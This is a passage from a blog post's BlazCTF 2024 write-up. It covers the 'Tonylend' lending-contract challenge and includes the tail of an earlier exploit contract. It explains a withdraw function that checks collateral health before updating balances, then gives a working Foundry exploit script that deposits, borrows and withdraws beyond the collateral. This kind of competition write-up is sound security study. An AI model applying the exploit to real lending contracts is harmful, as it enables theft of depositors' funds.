</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">treasury</span><span class="p">.</span><span class="n">doom</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="tonylend">Tonylend<a href="#tonylend" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="challenge-summary-3">Challenge Summary<a href="#challenge-summary-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<blockquote>
<p>Tony <a href="https://www.youtube.com/watch?v=3BrCvZmSnKA"
   
   target="_blank" rel="noopener noreferrer" >eats cats and dogs</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg>, and builds lending platform that competes with Trump's cryptocurrency.</p>
<p><a href="https://storage.googleapis.com/blazctf24/tony-lend.zip"
   
   target="_blank" rel="noopener noreferrer" >Handouts</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg></p>
</blockquote>
<p>There is a <code>TonyLend</code> contracts that somehow acts as a bank, which us to <code>deposit</code>, <code>withdraw</code>, <code>borrow</code>, <code>repay</code> and <code>liquidite</code>. For most of the operations, there is a check on the health score to avoid under-collateralization. There is also a <a href="https://resources.curve.fi/"
   
   target="_blank" rel="noopener noreferrer" >curve pool</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg> that trades wUSDe and wUSDC. Initially the user has 10000 wUSDe and 10000 wUSDc at the initial price of 1:1, and the goal is to obtain at least 21926 wUSDe.</p>
<h3 id="solution-3">Solution<a href="#solution-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <code>TonyLend::calculateHealthFactor</code> function that checks, in short, if we have less &quot;borrows&quot; than &quot;deposits&quot;. For instance, if the tokens I deposited and borrowed have respectively 3 ETH and 2 ETH in values, then the health score would be 1.5. In that case, we are said to be financially healthy in their contract. This value is checked in multiple functions like <code>TonyLend::borrow</code> and <code>TonyLend::withdraw</code>.</p>
<p>The health factor should be performed at the end to ensure the ending balances are healthy. However, <code>TonyLend::withdraw</code> is checking the health factor before the values are changed, which made people able to withdraw more tokens than expected. For instance, a user has 1 ETH deposited and 1 ETH borrowed, we should be unable to withdraw 1 ETH because it would end up at a health score 0. However, we can withdraw from the contract because the health score is 1 at the beginning.</p>
<p>Starting with 1 ETH, we can deposit it to the contract. We then can borrow 1 ETH and withdraw all the funds. We end up having 2 ETH. Our account in the contract needs to be liquidified, but we no longer need to deal with the contract anymore.</p>
<div style="text-align: center;">
  <div class="graphviz">
  digraph structs {
    rankdir=LR
<pre><code>node [color=&quot;#ffe4e1&quot;, fontcolor=&quot;#ffe4e1&quot;, fillcolor=&quot;#33333c&quot;, style=&quot;filled&quot;, shape=&quot;record&quot;]
graph [bgcolor=&quot;transparent&quot;]
edge [color=&quot;#ffe4e1&quot;, fontcolor=&quot;#ffe4e1&quot;]

state1 [label=&quot;{{User Balance: 1 ETH|Deposited: 0 ETH\nBorrowed 0 ETH}}&quot;]
state2 [label=&quot;{{User Balance: 0 ETH|Deposited: 1 ETH\nBorrowed 0 ETH}}&quot;]
state3 [label=&quot;{{User Balance: 1 ETH|Deposited: 1 ETH\nBorrowed 1 ETH}}&quot;]
state4 [
    label=&quot;{{User Balance: 2 ETH|Deposited: 0 ETH\nBorrowed 1 ETH}}&quot;,
    color=&quot;#ff5451&quot;, fontcolor=&quot;#ff5451&quot;
]

state1 -&gt; state2[label=&quot;Deposit 1 ETH&quot;]
state2 -&gt; state3[constraint=false, label=&quot;Borrow 1 ETH&quot;]
state3 -&gt; state4[label=&quot;Withdraw 1 ETH&quot;, color=&quot;#ff5451&quot;, fontcolor=&quot;#ff5451&quot;]
</code></pre>
<p>}</p>
  </div>
</div>    
<div class="alert success">
  ðŸ§€ <strong>Cheesed!</strong> The challenge authors later released a revenge called <em>Tonylend (No Longer Audited by CertiK)</em> to address the unintended solution. I wasn't able to solve without the cheese.
</div>

<h3 id="solution-script-3">Solution Script<a href="#solution-script-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Challenge</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/Challenge.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">TonyLend</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/TonyLend2.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ExploitScript</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Challenge</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">Challenge</span><span class="p">(</span><span class="mh">0x72998f0cffFe9Bf0fC7465188aCF3c5a8C77B616</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TonyLend</span> <span class="n">tonyLend</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">tonyLend</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">usdc</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">usdc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">usde</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">usde</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">usde</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">tonyLend</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">usdc</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">tonyLend</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">challenge</span><span class="p">.</span><span class="n">claimDust</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">tonyLend</span><span class="p">.</span><span class="n">deposit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="n">e4</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">tonyLend</span><span class="p">.</span><span class="n">deposit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="n">e4</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">tonyLend</span><span class="p">.</span><span class="n">borrow</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">.</span><span class="mi">2</span><span class="n">e4</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">tonyLend</span><span class="p">.</span><span class="n">withdraw</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="n">e4</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">usde</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xc0ffee</span><span class="p">),</span> <span class="mi">2</span><span class="p">.</span><span class="mi">2</span><span class="n">e4</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">isSolved</span><span class="p">(),</span> <span class="s">&#34;not solved&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>
        </div></div>

      
      <aside class="toc-container">
        <a href="#" class="toc-title-link">
          BlazCTF 2024 Writeup
        </a>
        <div class="js-toc"></div>
      </aside>
      

      
      <hr />
      <script src="https://giscus.app/client.js"
        data-repo="samueltangz/samueltangz.github.io"
        data-repo-id="MDEwOlJlcG9zaXRvcnkzMDI0MjQyMjE="
        data-category="General"
        data-category-id="DIC_kwDOEgagnc4C0haj"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="0"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="dark"
        data-lang="en"
        crossorigin="anonymous"
        async>
      </script>
      

      
      <hr />
      <div class="py-3">
        
          <a class="btn" href="/posts/2024/2024-12-31-retrospective/">â† Retrospective 2024</a>
        

        
          <a class="btn float-end" href="/posts/2024/2024-07-20-hitcon-ctf/">HITCON CTF 2024 Writeup â†’</a>
        
      </div>
      

    </div>
  </div>

    </div>
  </main>
  <div class="container">
  <footer class="py-3 my-4 border-top">
    <p class="text-center text-body-secondary">&copy; 2026 Powered by <em>Hugo</em>. Theme crafted by <em>Mystiz</em> with Bootstrap 5, inspired from <em>Terminal</em>.</p>
  </footer>
</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.css"
  integrity="sha384-Pu5+C18nP5dwykLJOhd2U4Xen7rjScHN/qusop27hdd2drI+lL5KvX7YntvT8yew" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/katex.min.js"
  integrity="sha384-2B8pfmZZ6JlVoScJm/5hQfNS2TI/6hPqDZInzzPc8oHpN5SgeNOf4LzREO6p5YtZ" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.27/dist/contrib/auto-render.min.js"
  integrity="sha384-hCXGrW6PitJEwbkoStFjeJxv+fSOOQKOPbJxSfM6G5sWZjAyWhXiTIIAmQqnlLlh" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }], trust: true })"></script>

<script src="https://cdn.jsdelivr.net/npm/@viz-js/viz@3.24.0/dist/viz-global.min.js"></script>
<script>
Viz.instance().then(viz => {
  const unescape = function (s) {
    const t = s.replace(/&amp;/g, '&')
    return t.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;/g, '"')
  }

  document.querySelectorAll('[class=graphviz]').forEach(node => {
    const source = unescape(node.innerText);
    const svg = viz.renderSVGElement(source, { engine: 'dot' });
    node.parentNode.appendChild(svg);
    node.style.display = 'none';
  });
});
</script>


<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js"
  integrity="sha512-BZUSsJAPNtkd+kdY/bD7hvQKZ5zlgWt++KGy/Pa/5uEJNgs0jZ6JaX6MuclRUanowuxmhb5S3LRPEa3QmrUVfA==" crossorigin="anonymous"
  referrerpolicy="no-referrer"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.css"
  integrity="sha512-/ANQiHMqpRl+E0zEAd250N21OOmJsYbhiJWY0Y8yG0TII47yZn1+gDNobMlf+h/FTyImprLXYgXbX3bCYyq/vg==" crossorigin="anonymous"
  referrerpolicy="no-referrer" />
<script type="text/javascript">
tocbot.init({
  headingSelector: 'h1, h2, h3, h4',
  orderedList: false,
  collapseDepth: 2,
  headingsOffset: 60,
  scrollSmoothOffset: -60
})
</script>


<script>
  document.querySelectorAll('pre code').forEach(el => {
    const lang = Array.from(el.classList).find(className => className.startsWith('language-'));
    if (!lang) return;

    
    if (lang.startsWith('language-diff-')) {
      el.classList.add('diff-highlight');
    }
  })
</script>
<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
mermaid.initialize({
  startOnLoad: true,
  htmlLabels: true,
  securityLevel: "loose",
  theme: 'base',
  themeVariables: {
    background: '#22222c',
    primaryColor: '#33333c',
    primaryTextColor: '#ffe4e1',
  }
});
</script>

</body>
</html>
